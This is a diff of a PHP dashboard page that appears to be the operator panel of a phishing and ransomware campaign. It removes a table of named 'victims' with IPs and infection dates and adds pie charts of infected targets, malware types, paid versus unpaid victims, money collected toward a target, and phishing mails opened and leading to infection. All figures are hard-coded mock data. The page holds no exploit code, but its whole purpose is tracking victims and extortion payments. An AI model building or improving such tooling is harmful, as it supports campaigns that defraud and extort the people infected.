@@ -1,48 +1,40 @@
 <?php
 
-function getAllVictims(){
-    # validate input for sql injection
-    # end points should response only local requests except few of them
-    $query = "SELECT * FROM ...";
 
-    $infos = array(
-        array("id"=>"1", "ip"=>"192.168.1.1", "username"=>"okan", "infection_date"=>"19/12/2020 21:33", "first_touch"=> "20/12/2020 09=>33", "country"=>"Turkey"),
-        array("id"=>"3", "ip"=>"12.32.12.1", "username"=>"ogulcan", "infection_date"=>"11/11/2020 21:33", "first_touch"=> "11/11/2020 21=>43", "country"=>"Turkey"),
-        array("id"=>"4", "ip"=>"34.43.15.12", "username"=>"idil", "infection_date"=>"19/12/2020 11:33", "first_touch"=> "20/12/2020 19=>33", "country"=>"Germany")
-    );
 
-    return json_encode($infos);
+function takeStaticsData(){
+
+    //$createinfect = file_get_contents("MIDDLEWAREXXX/dashboard/status/createinfect");
+    $createinfect = '{"created":280,"infected":80}';
+    $createinfect = json_decode($createinfect,true);
+    //$types_count = file_get_contents("MIDDLEWAREXXX/dashboard/status/typescount");
+    $types_count = '{"phishing":200,"adware":50,"wulnware":30}';
+    $types_count = json_decode($types_count,true);
+    //$payments = file_get_contents("MIDDLEWAREXXX/dashboard/status/paid");
+    $payments = '{"paid":50,"notpaid":30,"collected":3000,"target":10000}';
+    $payments = json_decode($payments,true);
+    //$mails = file_get_contents("MIDDLEWAREXXX/dashboard/status/mails");
+    $mails = '{"sent":200,"opened":125,"download":70,"runORinfectedbyphishing":30}';
+    $mails = json_decode($mails,true);
+    
+    return array_merge($createinfect,$types_count,$payments,$mails);
 }
 
-function createVictimTable(){
-    $victims = json_decode(getAllVictims());
-    //print_r($victims);
-    $table = '<table class="table table-bordered">';
-    $table.= '<thead>
-                    <tr>
-                    <th scope="col">ID</th>
-                    <th scope="col">IP</th>
-                    <th scope="col">Username</th>
-                    <th scope="col">Infection Date</th>
-                    <th scope="col">First Touch Date</th>
-                    <th scope="col">Country</th>
-                    </tr>
-                </thead>
-                <tbody>';
-    
-    foreach($victims as $vic){
-        $table.='<tr>';
-        foreach($vic as $ky => $vl){
-            #echo $ky."=>".$vl."<br>";
-            $table.='<td>'.$vl.'</td>';
-        }
-        $table.='</tr>';
-    }
+$stats = takeStaticsData();
+//print_r($stats);
 
-    $table.='</tbody>
-            </table>';
-    
-    return $table;
+
+
+function createDonutDiv($id,$title){
+    $htmldiv ='<div class="col-md-5 py-1">
+                <h2 class="display-5">'.$title.'</h2>
+                <div class="card">
+                    <div class="card-body">
+                        <canvas id="'.$id.'"></canvas>
+                    </div>
+                </div>
+            </div>';
+    return $htmldiv;
 }
 
 ?>
@@ -92,7 +84,84 @@ function createVictimTable(){
                     <a href="statistics.php">Statics</a> <!-- it will produced using payment rate, amount of collected money... -->
                 </div>
                 <div class="col-sm">
-                    HEY HEY HEY
+
+                    <script src="/js/chart.js"></script>
+
+
+                    <div class="container" id="graphics">
+                        <h1 class="display-5">HEADER1</h1>
+                            <div class="row py-2">
+                                <?php
+                                
+                                    $titles = array("Target Amount - Collected Money","Created - Infected", "Types", "Paid - Not Paid", "Sended Mail - Opened Mail",
+                                                    "Opened Mail - Infected","Paid - Not Paid");
+                                    $i = 1;
+                                    foreach($titles as $tit){
+                                        echo createDonutDiv("chDonut".$i++,$tit);
+                                    }
+
+                                ?>
+
+                        
+                        </div>
+                    </div>
+
+                    <script>
+                        var colors = ['#ff0000','#007bff','#28a745','#333333','#c3e6cb','#dc3545','#6c757d'];
+
+                        function donutmaker(elementid, labels, data){
+                            
+                            var donutOptions = {
+                            cutoutPercentage: 55, 
+                            legend: {position:'bottom', padding:5, labels: {pointStyle:'circle', usePointStyle:true}}
+                            };
+
+                            
+                            var chDonutData = {
+                                labels: labels,
+                                datasets: [
+                                {
+                                    backgroundColor: colors.slice(0,2),
+                                    borderWidth: 0,
+                                    data: data
+                                }
+                                ]
+                            };
+
+                            var chDonut = document.getElementById(elementid);
+                            if (chDonut) {
+                                var cd=new Chart(chDonut, {
+                                    type: 'pie',
+                                    data: chDonutData,
+                                    options: donutOptions
+                                });
+                            }
+
+                        }
+
+                        <?php
+                        
+                        $slices = "var slices = [";
+                        foreach($titles as $tit){
+                            if($tit === "Types"){$tit = "phishing - adware - wulnware";}
+                            $slices.="[";
+                            foreach(explode(" - ",$tit) as $t){
+                                $slices.="'".$t."',";
+                            }
+                            $slices.="],";
+                        }
+                        $slices.="];";
+                        // $slices = 'var slices = [placeholder yap]';
+                        echo $slices;
+                        ?>
+                        
+                        var donut_count=6;
+                        for (var i = 1; i<=donut_count; i++){   
+                            donutmaker("chDonut"+i,slices[0],[20,100]);
+                        }
+                        
+
+                    </script>
                 </div>
             </div>
         </div>
